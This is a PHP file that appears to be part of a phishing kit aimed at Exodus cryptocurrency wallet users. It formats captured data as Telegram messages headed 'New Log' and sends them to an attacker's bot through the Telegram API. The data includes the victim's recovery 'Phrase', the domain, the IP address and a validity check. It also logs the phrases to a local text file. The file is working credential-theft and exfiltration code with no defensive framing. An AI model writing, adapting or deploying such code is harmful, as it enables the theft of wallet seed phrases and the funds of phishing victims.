<?php

define("TELEGRAM_API_KEY", "TOKEN");
define("TELEGRAM_CHAT_ID", "CHATID");

function sendMessage($msg)
{
  $token = TELEGRAM_API_KEY;
  $chatID = TELEGRAM_CHAT_ID;
  $url =
    "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
  $url = $url . "&parse_mode=HTML&text=" . urlencode($msg);
  $ch = curl_init();
  $optArray = [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
  ];
  curl_setopt_array($ch, $optArray);
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}

function constructMessage($phrase, $domain, $user_ip, $case, $case2)
{
  $telegramMessage = "<b>💸 New Log " . $case . " 💸</b>";
  $telegramMessage .= "\n\n";
  $telegramMessage .= "<b>Phrase: </b>" . $phrase;
  $telegramMessage .= "\n\n";
  $telegramMessage .= "<b>Domain: </b>" . $domain;
  $telegramMessage .= "\n\n";
  $telegramMessage .= "<b>IP: </b>" . $user_ip;
  $telegramMessage .= "\n\n";
  if ($case == "(Valid)") {
    $telegramMessage .= "<b>Valid: </b> ✅";
    $telegramMessage .= "\n\n";
  } else {
    $telegramMessage .= "<b>Valid: </b> ❌";
    $telegramMessage .= "\n\n";
  }
  if ($case2 == "presend") {
    $telegramMessage .= "<b>Presend: </b> ✅";
    $telegramMessage .= "\n\n";
  }
  $telegramMessage .= "<b>Type: </b> Exodus";
  return $telegramMessage;
}

function appendFile($content)
{
  $file = fopen("phases.txt", "a");
  fwrite($file, $content . "\n");
  fclose($file);
}
